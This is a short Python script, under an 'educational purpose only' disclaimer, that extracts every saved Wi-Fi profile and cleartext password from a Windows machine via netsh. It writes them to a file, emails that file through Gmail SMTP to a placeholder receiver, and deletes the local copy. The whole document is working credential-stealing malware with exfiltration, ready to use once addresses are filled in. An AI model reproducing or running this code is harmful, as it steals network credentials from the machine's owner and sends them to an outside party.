"""
THIS SCRIPT IS FOR EDUCATIONAL PURPOSE ONLY.
DO NOT USE THIS FOR MALICIOUS PURPOSE.
WHATEVER YOU DO WITH THIS SCRIPT I AM NOT RESPONSIBLE FOR ANY KIND OF ILLEGAL ACT DONE BY YOU.
"""

import subprocess # to run the terminal command through this script
import os
import smtplib


######################################## Wifi password extractor ############################################

main_cmd = str(subprocess.check_output("netsh wlan show profiles")) # get network names
cmd = main_cmd.split(r'\n')  # each line gets converted to one item of a list

# the output contains \r.
cmd = '\n'.join(cmd).replace(r'\r', '').replace("'", '').strip()

# removing the unwanted things that appear at top
cmd = cmd[140:].replace('    ', '').strip()

# it removes all "All User Profile : " thing and we get only wifi names
cmd = cmd.split('All User Profile : ')

# above cmd var contains each profile
for x in cmd:
    if x != '': # if the wifi name is not empty
        wifi_name = x.strip().replace('\n', '').strip() # removing the extra lines and spaces

        # running the command that fetches full wifi profile
        pswd = subprocess.check_output(f"netsh wlan show profile {wifi_name} key=clear").decode()

        ssid_idx = pswd.find("SSID name              : ") # get the the index of this string
        netword_idx = pswd.find("Network type") # it contains "Network type" thing to next line of wifi pass

        # +25 is the length of "SSID name              : " this string
        # wifi password exist between "SSID name              : " and "Network type"
        wifi_ssid = pswd[ssid_idx+25:netword_idx].strip()  # got the wifi ssid

        # get the the index of this string
        key_idx = pswd.find('Key Content            :')

        cost_idx = pswd.find("Cost settings") # contains "Cost settings" next to password

        # +25 is the length of 'Key Content            :' this string
        # wifi password exist between "Key Content            :" and "Cost settings"
        wifi_pswd = pswd[key_idx+25:cost_idx].strip()

        # "s interface on the system." means the wifi is no more
        if wifi_ssid != "s interface on the system.":
            final_output = f"[+] wifi ssid: {wifi_ssid} | pswd: {wifi_pswd} |"

            with open('pswd.txt', 'a') as f:
                f.write(f"{final_output}\n")

################################# email sender ########################################################

my_gmail = "YOUR EMAIL ADDRESS" # this email address will be used to send wifi passwords
my_pswd = "YOUR EMAIL PASS" # WARNING: DON'T USE YOUR MAIN EMAIL USE A DUMMY EMAIL INSTEAD

reciever = "RECIEVER EMAIL ADDRESS" # THIS EMAIL ADDRESS WILL RECIEVE THE WIFI PASSWORDS

smtp_server = smtplib.SMTP('smtp.gmail.com', 587)
smtp_server.ehlo()
smtp_server.starttls()
smtp_server.ehlo()
smtp_server.login(my_gmail, my_pswd)

with open('pswd.txt', 'r') as f:
    id_pass = f.read()

message = id_pass

msg = f"To: {reciever}\nFrom: {my_gmail}\nSubject: wifi passwords\n\n{message}"

smtp_server.sendmail(from_addr=my_gmail, to_addrs=reciever, msg=msg)

smtp_server.close()
os.remove('pswd.txt')